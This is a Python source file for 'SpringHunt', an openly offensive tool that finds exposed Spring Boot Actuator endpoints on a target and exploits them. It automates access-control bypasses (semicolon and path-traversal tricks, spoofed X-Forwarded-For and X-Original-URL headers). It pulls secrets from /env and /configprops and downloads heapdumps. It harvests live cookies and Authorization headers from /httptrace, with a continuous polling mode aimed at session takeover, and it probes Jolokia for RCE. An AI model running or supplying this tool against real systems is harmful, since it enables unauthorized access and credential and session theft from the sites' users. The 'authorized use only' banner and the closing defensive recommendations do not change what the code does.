#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║        SpringHunt - Spring Boot Actuator Hunter & Exploiter      ║
║        Techniques from dsecured.com actuator misconfig blog      ║
║        For authorized pentesting and bug bounty only             ║
╚══════════════════════════════════════════════════════════════════╝

Techniques covered:
  1. Multi-path discovery (beyond /actuator/)
  2. Endpoint enumeration (health, env, heapdump, mappings, etc.)
  3. Header bypasses (X-Forwarded-For, X-Original-URL)
  4. Semicolon & path traversal WAF bypasses
  5. Credential/secret extraction from /env and /heapdump
  6. Session harvesting from /httptrace / /actuator/httpexchanges
  7. Jolokia RCE detection
  8. Shutdown/restart DoS detection
  9. Configprops & beans enumeration
 10. Subdomain-hinted path discovery
"""

import argparse
import json
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] requests not installed. Run: pip install requests --break-system-packages")
    sys.exit(1)

# ─────────────────────────────────────────────
# CONFIG / WORDLISTS
# ─────────────────────────────────────────────

# All possible actuator base paths (blog: look beyond /actuator/)
ACTUATOR_BASE_PATHS = [
    "/actuator",
    "/api/actuator",
    "/api/v1/actuator",
    "/api/v2/actuator",
    "/manage",
    "/management",
    "/admin",
    "/admin/actuator",
    "/application",
    "/app",
    "/monitor",
    "/monitoring",
    "/internal",
    "/private",
    "/ops",
    "/health",          # some apps expose health at root level
    "/info",
    "/metrics",
]

# All known actuator sub-endpoints
ACTUATOR_ENDPOINTS = [
    "health",
    "info",
    "env",
    "configprops",
    "mappings",
    "beans",
    "metrics",
    "httptrace",
    "httpexchanges",    # Spring Boot 3.x renamed httptrace
    "heapdump",
    "threaddump",
    "dump",
    "trace",
    "logfile",
    "loggers",
    "refresh",
    "restart",
    "shutdown",         # ⚠ DoS potential
    "jolokia",          # ⚠ RCE potential
    "gateway/routes",
    "gateway/filters",
    "flyway",
    "liquibase",
    "auditevents",
    "caches",
    "scheduledtasks",
    "integrationgraph",
    "prometheus",
    "startup",
    "conditions",
]

# Bypass variants for a given path
def build_bypass_variants(base: str, endpoint: str) -> list[dict]:
    """Returns list of {url_suffix, headers, description} dicts"""
    path = f"{base}/{endpoint}"
    variants = []

    # 1. Standard
    variants.append({"suffix": path, "headers": {}, "desc": "Standard"})

    # 2. Trailing slash
    variants.append({"suffix": path + "/", "headers": {}, "desc": "Trailing slash"})

    # 3. Semicolon bypass (blog: GET /actuator/env;.. works)
    variants.append({"suffix": f"{base}/{endpoint};", "headers": {}, "desc": "Semicolon"})
    variants.append({"suffix": f"{base}/{endpoint};..", "headers": {}, "desc": "Semicolon+dotdot"})
    variants.append({"suffix": f"{base};/{endpoint}", "headers": {}, "desc": "Semicolon on base"})

    # 4. Path traversal combos
    variants.append({"suffix": f"{base}/%2F{endpoint}", "headers": {}, "desc": "URL-encoded slash"})
    variants.append({"suffix": f"{base}//{endpoint}", "headers": {}, "desc": "Double slash"})
    variants.append({"suffix": f"{base}/./{endpoint}", "headers": {}, "desc": "Dot-slash"})
    variants.append({"suffix": f"{base}/%252F{endpoint}", "headers": {}, "desc": "Double URL-encoded slash"})

    # 5. X-Forwarded-For: 127.0.0.1 (blog: this alone was enough in one case)
    for h_val in ["127.0.0.1", "localhost", "::1"]:
        variants.append({
            "suffix": path,
            "headers": {"X-Forwarded-For": h_val},
            "desc": f"XFF:{h_val}"
        })
        variants.append({
            "suffix": path,
            "headers": {"X-Forwarded-Host": h_val, "X-Forwarded-For": h_val},
            "desc": f"XFF+XFH:{h_val}"
        })

    # 6. X-Original-URL override (blog mentions this works sometimes)
    variants.append({
        "suffix": "/",
        "headers": {"X-Original-URL": path, "X-Forwarded-For": "127.0.0.1"},
        "desc": "X-Original-URL override"
    })
    variants.append({
        "suffix": "/",
        "headers": {"X-Rewrite-URL": path, "X-Forwarded-For": "127.0.0.1"},
        "desc": "X-Rewrite-URL override"
    })
    variants.append({
        "suffix": "/index",
        "headers": {"X-Original-URL": path},
        "desc": "X-Original-URL on /index"
    })

    # 7. Uppercase/mixed case (some WAF bypasses)
    variants.append({"suffix": f"{base}/{endpoint.upper()}", "headers": {}, "desc": "Uppercase endpoint"})

    # 8. Spring-specific: /actuator/../actuator/env  (path traversal)
    variants.append({"suffix": f"{base}/../{base.lstrip('/')}/{endpoint}", "headers": {}, "desc": "Parent traversal"})

    return variants


# ─────────────────────────────────────────────
# HTTP HELPERS
# ─────────────────────────────────────────────

def make_session(proxy: str = None, timeout: int = 10, extra_headers: dict = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; SpringHunt/1.0)",
        "Accept": "application/json, */*",
        "Connection": "close",
    })
    if extra_headers:
        s.headers.update(extra_headers)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.timeout = timeout
    return s


def probe(session: requests.Session, url: str, extra_headers: dict = None) -> requests.Response | None:
    try:
        h = dict(session.headers)
        if extra_headers:
            h.update(extra_headers)
        r = session.get(url, headers=h, allow_redirects=False)
        return r
    except Exception:
        return None


def is_actuator_response(resp: requests.Response) -> bool:
    """Heuristic: is this likely a real Actuator response?"""
    if resp is None:
        return False
    ct = resp.headers.get("Content-Type", "")
    if resp.status_code in (401, 403):
        # 401/403 hints presence (blog: HTTP 404 hints, but 401/403 is even stronger)
        return True
    if resp.status_code == 200:
        body = resp.text.lower()
        # JSON with actuator keywords
        if any(k in body for k in ('"_links"', '"status"', '"diskspace"', '"db"', '"propertysources"',
                                    '"beans"', '"mappings"', '"measurements"')):
            return True
        if "application/vnd.spring-boot.actuator" in ct:
            return True
        if "application/json" in ct and len(resp.text) > 10:
            return True
    return False


# ─────────────────────────────────────────────
# DISCOVERY
# ─────────────────────────────────────────────

def discover_actuator_base(target: str, session: requests.Session, verbose: bool = False) -> list[dict]:
    """Find all reachable actuator base paths"""
    found = []
    print(f"\n[*] Phase 1: Discovering actuator base paths on {target}")

    def check_base(base_path):
        url = target.rstrip("/") + base_path
        r = probe(session, url)
        if r is None:
            return None
        hint = None
        if r.status_code == 200:
            try:
                j = r.json()
                if "_links" in j or "links" in j:
                    hint = "actuator index"
            except Exception:
                pass
            if not hint and is_actuator_response(r):
                hint = f"HTTP 200 - possible"
        elif r.status_code in (401, 403):
            hint = f"HTTP {r.status_code} - blocked but EXISTS"
        elif r.status_code == 404:
            # Blog: 404 can also hint at actuator being present
            if "application/vnd.spring-boot" in r.headers.get("Content-Type", ""):
                hint = "Spring Boot 404 (actuator present but endpoint blocked)"
        if hint:
            return {"base": base_path, "url": url, "status": r.status_code, "hint": hint, "response": r}
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_base, bp): bp for bp in ACTUATOR_BASE_PATHS}
        for f in as_completed(futures):
            result = f.result()
            if result:
                print(f"  [+] FOUND: {result['url']}  [{result['status']}] → {result['hint']}")
                found.append(result)
            elif verbose:
                print(f"  [-] {futures[f]}")
    return found


# ─────────────────────────────────────────────
# ENDPOINT PROBING WITH BYPASSES
# ─────────────────────────────────────────────

def probe_endpoints(target: str, base_path: str, session: requests.Session, verbose: bool) -> list[dict]:
    """For each endpoint, try standard + all bypass variants"""
    print(f"\n[*] Phase 2: Probing endpoints under {base_path} (with bypasses)")
    findings = []
    base_url = target.rstrip("/")

    def check_endpoint(ep):
        ep_findings = []
        variants = build_bypass_variants(base_path, ep)
        for v in variants:
            url = base_url + v["suffix"]
            r = probe(session, url, v["headers"])
            if r is None:
                continue
            if r.status_code in (200, 206):
                ep_findings.append({
                    "endpoint": ep,
                    "url": url,
                    "method": "GET",
                    "status": r.status_code,
                    "bypass": v["desc"],
                    "headers_used": v["headers"],
                    "content_type": r.headers.get("Content-Type", ""),
                    "size": len(r.content),
                    "response": r,
                })
                # Stop at first successful hit for this endpoint
                break
            elif r.status_code in (401, 403):
                # Record protected endpoint (still interesting)
                ep_findings.append({
                    "endpoint": ep,
                    "url": url,
                    "method": "GET",
                    "status": r.status_code,
                    "bypass": v["desc"],
                    "headers_used": v["headers"],
                    "content_type": r.headers.get("Content-Type", ""),
                    "size": 0,
                    "response": r,
                })
        return ep_findings

    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = {ex.submit(check_endpoint, ep): ep for ep in ACTUATOR_ENDPOINTS}
        for f in as_completed(futures):
            results = f.result()
            for res in results:
                status = res["status"]
                icon = "🟢" if status == 200 else "🔴"
                bypass_tag = f" [bypass: {res['bypass']}]" if res["bypass"] != "Standard" and status == 200 else ""
                print(f"  {icon} {res['url']}  [{status}]{bypass_tag}")
                findings.append(res)
    return findings


# ─────────────────────────────────────────────
# EXTRACTION: ENV / CONFIGPROPS
# ─────────────────────────────────────────────

SECRET_PATTERNS = [
    r"(?i)(password|passwd|secret|token|api[_-]?key|apikey|private[_-]?key|access[_-]?key|auth|credential|db[_-]?pass)",
    r"(?i)(aws[_-]?(access|secret)|azure|gcp|s3[_-]?bucket)",
    r"(?i)(jdbc|datasource|database)[^=]*url",
    r"(?i)(redis|mongo|rabbit|kafka)[^=]*(pass|host|uri)",
    r"(?i)bearer\s+[a-zA-Z0-9\-_\.]+",
    r"AKIA[0-9A-Z]{16}",  # AWS Access Key
    r"(?i)eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",  # JWT
]

def extract_secrets_from_env(resp: requests.Response) -> list[dict]:
    """Parse /env response for credentials and sensitive values"""
    secrets = []
    try:
        data = resp.json()
    except Exception:
        return secrets

    def scan_value(key: str, val):
        if not isinstance(val, str):
            val = str(val)
        for pat in SECRET_PATTERNS:
            if re.search(pat, key) or re.search(pat, val):
                masked = val[:6] + "***" + val[-4:] if len(val) > 12 else "***"
                # Note: env sometimes masks with ******** - still interesting to flag
                secrets.append({
                    "key": key,
                    "value_preview": masked,
                    "raw_masked": "******" in val,
                    "pattern_match": pat,
                })
                break

    def recurse(obj, prefix=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_key = f"{prefix}.{k}" if prefix else k
                if isinstance(v, (dict, list)):
                    recurse(v, new_key)
                else:
                    scan_value(new_key, v)
        elif isinstance(obj, list):
            for item in obj:
                recurse(item, prefix)

    recurse(data)
    return secrets


def extract_from_configprops(resp: requests.Response) -> list[dict]:
    """Parse /configprops similarly"""
    return extract_secrets_from_env(resp)  # same structure effectively


# ─────────────────────────────────────────────
# EXTRACTION: HTTPTRACE / HTTPEXCHANGES
# ─────────────────────────────────────────────

def harvest_sessions_from_trace(resp: requests.Response) -> list[dict]:
    """Extract cookies/auth headers from httptrace (blog: led to admin session takeover)"""
    sessions = []
    try:
        data = resp.json()
    except Exception:
        return sessions

    traces = []
    if isinstance(data, dict):
        traces = data.get("traces", data.get("exchanges", []))
    elif isinstance(data, list):
        traces = data

    for trace in traces:
        req = trace.get("request", trace.get("info", {}).get("request", {}))
        resp_data = trace.get("response", trace.get("info", {}).get("response", {}))
        headers = req.get("headers", {})
        resp_headers = resp_data.get("headers", {})

        extracted = {}
        # Cookies from request
        cookie_hdr = headers.get("cookie", headers.get("Cookie", []))
        if cookie_hdr:
            extracted["cookies"] = cookie_hdr if isinstance(cookie_hdr, str) else "; ".join(cookie_hdr)
        # Authorization header
        auth_hdr = headers.get("authorization", headers.get("Authorization", []))
        if auth_hdr:
            extracted["authorization"] = auth_hdr if isinstance(auth_hdr, str) else auth_hdr[0] if auth_hdr else ""
        # Set-Cookie from response
        set_cookie = resp_headers.get("set-cookie", resp_headers.get("Set-Cookie", []))
        if set_cookie:
            extracted["set_cookie"] = set_cookie

        if extracted:
            extracted["url"] = req.get("uri", req.get("url", "unknown"))
            extracted["method"] = req.get("method", "GET")
            extracted["timestamp"] = trace.get("timestamp", "")
            sessions.append(extracted)

    return sessions


# ─────────────────────────────────────────────
# HEAPDUMP ANALYSIS
# ─────────────────────────────────────────────

def analyze_heapdump_hint(resp: requests.Response) -> dict:
    """Can't fully parse a heapdump in Python easily, but we can grep for string patterns"""
    result = {"size_mb": round(len(resp.content) / 1024 / 1024, 2), "strings_found": []}
    # Grep for common secret patterns in raw bytes
    raw = resp.content
    # Look for common patterns
    patterns = [
        (b"password", "password"),
        (b"secret", "secret"),
        (b"AKIA", "AWS Key prefix"),
        (b"jdbc:", "JDBC connection string"),
        (b"mongodb://", "MongoDB URI"),
        (b"redis://", "Redis URI"),
        (b"amqp://", "AMQP/RabbitMQ URI"),
        (b"Bearer ", "Bearer token"),
        (b"eyJ", "Possible JWT"),
    ]
    for pat_bytes, label in patterns:
        if pat_bytes.lower() in raw.lower():
            result["strings_found"].append(label)
    return result


# ─────────────────────────────────────────────
# DANGEROUS ENDPOINT CHECKS
# ─────────────────────────────────────────────

def check_jolokia(target: str, base: str, session: requests.Session) -> dict | None:
    """Check for Jolokia RCE surface"""
    paths = [
        f"{base}/jolokia",
        f"{base}/jolokia/list",
        "/jolokia",
        "/jolokia/list",
        "/api/jolokia",
    ]
    for p in paths:
        url = target.rstrip("/") + p
        r = probe(session, url)
        if r and r.status_code == 200:
            try:
                j = r.json()
                if "value" in j or "request" in j or "jolokia" in str(j).lower():
                    # Try to list exec beans
                    exec_url = target.rstrip("/") + p.replace("/list", "") + "/exec/java.lang:type=Runtime/availableProcessors"
                    r2 = probe(session, exec_url)
                    return {
                        "url": url,
                        "jolokia_list_url": url,
                        "exec_test": exec_url,
                        "exec_reachable": r2 and r2.status_code == 200,
                        "note": "Jolokia found - potential RCE via ClassLoading/JNDI",
                    }
            except Exception:
                pass
    return None


def check_shutdown(target: str, base: str, session: requests.Session) -> dict | None:
    """Detect (but NOT trigger) the /shutdown endpoint"""
    url = target.rstrip("/") + f"{base}/shutdown"
    # Only do OPTIONS/HEAD - never POST
    try:
        r = session.options(url)
        allow = r.headers.get("Allow", "")
        if "POST" in allow:
            return {"url": url, "note": "POST allowed - DoS risk! (NOT triggered)"}
        # Try HEAD
        r2 = session.head(url)
        if r2.status_code not in (404, 405, 501):
            return {"url": url, "status": r2.status_code, "note": "Responds to HEAD - may accept POST"}
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────
# SUBDOMAIN PATH HINT (blog: vadt.management.domain.com → try vadt/, management/)
# ─────────────────────────────────────────────

def extract_subdomain_hints(target: str) -> list[str]:
    """Extract URL components that might hint at actuator sub-paths"""
    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname or ""
    parts = host.split(".")
    hints = []
    for part in parts:
        if part not in ("www", "api", "app", "web", "http", "https"):
            hints.append(f"/{part}")
            hints.append(f"/{part}/actuator")
            hints.append(f"/api/{part}")
    return hints


# ─────────────────────────────────────────────
# REPORT GENERATION
# ─────────────────────────────────────────────

def build_report(target: str, findings: dict, outfile: str = None) -> str:
    lines = []
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines += [
        "=" * 70,
        f"  SpringHunt Report",
        f"  Target : {target}",
        f"  Date   : {ts}",
        "=" * 70,
        "",
    ]

    # Base paths found
    lines.append("[ DISCOVERED BASE PATHS ]")
    if findings.get("base_paths"):
        for b in findings["base_paths"]:
            lines.append(f"  ✓ {b['url']}  [{b['status']}]  {b['hint']}")
    else:
        lines.append("  None found")
    lines.append("")

    # Endpoints
    lines.append("[ ACCESSIBLE ENDPOINTS ]")
    accessible = [f for f in findings.get("endpoints", []) if f["status"] == 200]
    protected = [f for f in findings.get("endpoints", []) if f["status"] in (401, 403)]

    if accessible:
        lines.append("  OPEN (200):")
        for e in sorted(accessible, key=lambda x: x["endpoint"]):
            bypass_note = f"  ← bypass: {e['bypass']}" if e["bypass"] != "Standard" else ""
            lines.append(f"    🟢 {e['url']}  [{e['size']} bytes]{bypass_note}")
    if protected:
        lines.append("  PROTECTED (401/403) - endpoint exists but blocked:")
        for e in sorted(protected, key=lambda x: x["endpoint"]):
            lines.append(f"    🔴 {e['url']}  [{e['status']}]")
    if not accessible and not protected:
        lines.append("  None found")
    lines.append("")

    # Secrets
    lines.append("[ EXTRACTED SECRETS / SENSITIVE KEYS ]")
    if findings.get("secrets"):
        for s in findings["secrets"]:
            masked_note = " (value was already masked by Spring)" if s.get("raw_masked") else ""
            lines.append(f"  ⚠  {s['key']} = {s['value_preview']}{masked_note}")
    else:
        lines.append("  None extracted")
    lines.append("")

    # Sessions
    lines.append("[ HARVESTED SESSIONS / TOKENS FROM HTTPTRACE ]")
    if findings.get("sessions"):
        for s in findings["sessions"]:
            lines.append(f"  ⚠  URL: {s.get('url', '')}")
            if s.get("cookies"):
                lines.append(f"     Cookie: {s['cookies'][:120]}")
            if s.get("authorization"):
                lines.append(f"     Auth:   {s['authorization'][:120]}")
            if s.get("set_cookie"):
                lines.append(f"     Set-Cookie: {str(s['set_cookie'])[:120]}")
    else:
        lines.append("  None found")
    lines.append("")

    # Heapdump
    lines.append("[ HEAPDUMP ANALYSIS ]")
    if findings.get("heapdump"):
        h = findings["heapdump"]
        lines.append(f"  Size: {h['size_mb']} MB")
        if h["strings_found"]:
            lines.append(f"  Strings found: {', '.join(h['strings_found'])}")
            lines.append("  → Recommend: open with VisualVM/Eclipse MAT to extract masked secrets")
        else:
            lines.append("  No obvious secret patterns found in binary scan")
    else:
        lines.append("  Not accessible")
    lines.append("")

    # Jolokia
    lines.append("[ JOLOKIA (RCE SURFACE) ]")
    if findings.get("jolokia"):
        j = findings["jolokia"]
        lines.append(f"  ⚠  {j['url']}")
        lines.append(f"     {j['note']}")
        if j.get("exec_reachable"):
            lines.append("  ⚠  exec/ endpoint is REACHABLE - RCE may be possible!")
    else:
        lines.append("  Not found")
    lines.append("")

    # Shutdown
    lines.append("[ SHUTDOWN ENDPOINT (DoS Risk) ]")
    if findings.get("shutdown"):
        s = findings["shutdown"]
        lines.append(f"  ⚠  {s['url']}")
        lines.append(f"     {s['note']}")
    else:
        lines.append("  Not detected")
    lines.append("")

    # Bypasses that worked
    lines.append("[ SUCCESSFUL BYPASS TECHNIQUES ]")
    bypass_wins = [f for f in findings.get("endpoints", []) if f["status"] == 200 and f["bypass"] != "Standard"]
    if bypass_wins:
        seen = set()
        for f in bypass_wins:
            key = f["bypass"]
            if key not in seen:
                seen.add(key)
                lines.append(f"  ✓ {key}")
                if f["headers_used"]:
                    for hk, hv in f["headers_used"].items():
                        lines.append(f"      Header: {hk}: {hv}")
    else:
        lines.append("  No bypass was needed (or none worked)")
    lines.append("")

    lines.append("[ RECOMMENDATIONS ]")
    lines += [
        "  1. Restrict actuator endpoints to internal IPs only",
        "  2. Disable unnecessary endpoints (especially env, heapdump, shutdown, jolokia)",
        "  3. Enable authentication for all actuator paths",
        "  4. Move actuator base path to a non-standard path with auth",
        "  5. Do NOT trust X-Forwarded-For for access control",
        "  6. Review WAF rules - semicolon and traversal bypasses are common",
        "  7. Rotate any secrets found in /env or heapdump immediately",
    ]
    lines.append("")
    lines.append("=" * 70)
    lines.append("  End of Report - For authorized use only")
    lines.append("=" * 70)

    report_text = "\n".join(lines)

    if outfile:
        Path(outfile).write_text(report_text)
        print(f"\n[+] Report saved to: {outfile}")

    return report_text


# ─────────────────────────────────────────────
# CONTINUOUS HTTPTRACE HARVESTER (blog technique)
# ─────────────────────────────────────────────

def continuous_trace_harvest(session: requests.Session, trace_url: str, interval: int = 5, max_rounds: int = 10):
    """
    Blog technique: poll httptrace every N seconds, collect sessions.
    Only use if the program's rules of engagement allow it.
    """
    print(f"\n[*] Continuous httptrace harvest: {trace_url}")
    print(f"    Polling every {interval}s for {max_rounds} rounds (Ctrl+C to stop)")
    all_sessions = []
    seen_cookies = set()

    try:
        for i in range(max_rounds):
            r = probe(session, trace_url)
            if r and r.status_code == 200:
                sessions = harvest_sessions_from_trace(r)
                for s in sessions:
                    key = str(s.get("cookies", "")) + str(s.get("authorization", ""))
                    if key and key not in seen_cookies:
                        seen_cookies.add(key)
                        all_sessions.append(s)
                        print(f"  [+] NEW session captured from {s.get('url', 'unknown')}")
                        if s.get("cookies"):
                            print(f"      Cookie: {str(s['cookies'])[:100]}")
                        if s.get("authorization"):
                            print(f"      Auth:   {str(s['authorization'])[:100]}")
            print(f"  Round {i+1}/{max_rounds} complete. Total unique sessions: {len(all_sessions)}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Harvest stopped by user")

    return all_sessions


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def banner():
    print(r"""
  ___          _           _   _             _   
 / __|_ __ _ _(_)_ _  __ _| | | |_  _ _ _ _| |_ 
 \__ \ '_ \ '_| | ' \/ _` | |_| | || | ' \  _|
 |___/ .__/_| |_|_||_\__, |\___/ \_,_|_||_\__|
     |_|              |___/                      
  Spring Boot Actuator Hunter v1.0
  Techniques: dsecured.com actuator misconfig blog
  For authorized pentesting and bug bounty ONLY
""")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="Spring Boot Actuator Hunter - automated misconfig exploitation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 springhunt.py -u https://target.com
  python3 springhunt.py -u https://target.com -v --proxy http://127.0.0.1:8080
  python3 springhunt.py -u https://target.com --harvest --harvest-rounds 20
  python3 springhunt.py -u https://target.com -o report.txt
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://target.com)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("--cookies", help='Session cookies header value (e.g. "session=abc123")')
    parser.add_argument("--token", help="Bearer token for Authorization header")
    parser.add_argument("-o", "--output", help="Save report to file")
    parser.add_argument("--harvest", action="store_true", help="Enable continuous httptrace session harvesting")
    parser.add_argument("--harvest-rounds", type=int, default=10, help="Rounds for harvest mode (default: 10)")
    parser.add_argument("--harvest-interval", type=int, default=5, help="Seconds between harvest polls (default: 5)")
    parser.add_argument("--no-heapdump", action="store_true", help="Skip downloading heapdump (can be large)")
    args = parser.parse_args()

    target = args.url.rstrip("/")

    extra_headers = {}
    if args.cookies:
        extra_headers["Cookie"] = args.cookies
    if args.token:
        extra_headers["Authorization"] = f"Bearer {args.token}"

    session = make_session(proxy=args.proxy, timeout=args.timeout, extra_headers=extra_headers)

    all_findings = {
        "base_paths": [],
        "endpoints": [],
        "secrets": [],
        "sessions": [],
        "heapdump": None,
        "jolokia": None,
        "shutdown": None,
    }

    # Phase 0: subdomain path hints
    hints = extract_subdomain_hints(target)
    if hints:
        print(f"[*] Subdomain-derived path hints: {hints}")
        for h in hints:
            if h not in ACTUATOR_BASE_PATHS:
                ACTUATOR_BASE_PATHS.insert(0, h)

    # Phase 1: Find base paths
    all_findings["base_paths"] = discover_actuator_base(target, session, args.verbose)

    # Phase 2: Probe endpoints for each found base path
    probed_bases = set()
    bases_to_probe = [b["base"] for b in all_findings["base_paths"]] or ACTUATOR_BASE_PATHS[:5]
    for base in bases_to_probe:
        if base not in probed_bases:
            probed_bases.add(base)
            eps = probe_endpoints(target, base, session, args.verbose)
            all_findings["endpoints"].extend(eps)

    # Phase 3: Deep extraction from accessible endpoints
    print("\n[*] Phase 3: Extracting sensitive data from accessible endpoints")
    trace_url = None

    for ep_hit in all_findings["endpoints"]:
        if ep_hit["status"] != 200:
            continue
        ep = ep_hit["endpoint"]
        r = ep_hit["response"]

        if ep in ("env", "environment"):
            print(f"  [+] Analyzing /env for secrets...")
            secrets = extract_secrets_from_env(r)
            if secrets:
                print(f"      Found {len(secrets)} potential sensitive keys")
            all_findings["secrets"].extend(secrets)

        elif ep == "configprops":
            print(f"  [+] Analyzing /configprops for secrets...")
            secrets = extract_from_configprops(r)
            all_findings["secrets"].extend(secrets)

        elif ep in ("httptrace", "httpexchanges", "trace"):
            print(f"  [+] Analyzing /{ep} for sessions/cookies...")
            trace_url = ep_hit["url"]
            sessions = harvest_sessions_from_trace(r)
            if sessions:
                print(f"      Found {len(sessions)} sessions/tokens!")
            all_findings["sessions"].extend(sessions)

        elif ep == "heapdump" and not args.no_heapdump:
            print(f"  [+] Downloading heapdump from {ep_hit['url']} (may be large)...")
            # Re-fetch to get full content
            r_heap = probe(session, ep_hit["url"], ep_hit.get("headers_used"))
            if r_heap and r_heap.status_code == 200:
                print(f"      Downloaded {len(r_heap.content)/1024/1024:.1f} MB")
                # Save locally
                heap_path = f"/mnt/user-data/outputs/heapdump_{int(time.time())}.hprof"
                Path(heap_path).write_bytes(r_heap.content)
                print(f"      Saved to: {heap_path}")
                all_findings["heapdump"] = analyze_heapdump_hint(r_heap)
                all_findings["heapdump"]["saved_to"] = heap_path

    # Phase 4: Special checks
    print("\n[*] Phase 4: Special checks (Jolokia, Shutdown)")
    for base in list(probed_bases)[:3]:
        if not all_findings["jolokia"]:
            j = check_jolokia(target, base, session)
            if j:
                all_findings["jolokia"] = j
                print(f"  ⚠  Jolokia found at {j['url']}")
        if not all_findings["shutdown"]:
            s = check_shutdown(target, base, session)
            if s:
                all_findings["shutdown"] = s
                print(f"  ⚠  Shutdown endpoint detected at {s['url']}")

    # Phase 5: Optional continuous harvest
    if args.harvest and trace_url:
        print(f"\n[!] Starting continuous harvest mode (ensure you have authorization!)")
        harvested = continuous_trace_harvest(
            session, trace_url,
            interval=args.harvest_interval,
            max_rounds=args.harvest_rounds
        )
        all_findings["sessions"].extend(harvested)

    # Generate report
    report = build_report(target, all_findings, args.output)
    print("\n" + report)

    # Save JSON findings
    json_out = args.output.replace(".txt", ".json") if args.output else None
    if json_out:
        # Can't serialize response objects
        json_safe = {k: v for k, v in all_findings.items()
                     if k not in ("endpoints",)}
        json_safe["endpoints"] = [
            {k2: v2 for k2, v2 in ep.items() if k2 != "response"}
            for ep in all_findings["endpoints"]
        ]
        Path(json_out).write_text(json.dumps(json_safe, indent=2, default=str))
        print(f"[+] JSON findings saved to: {json_out}")


if __name__ == "__main__":
    main()
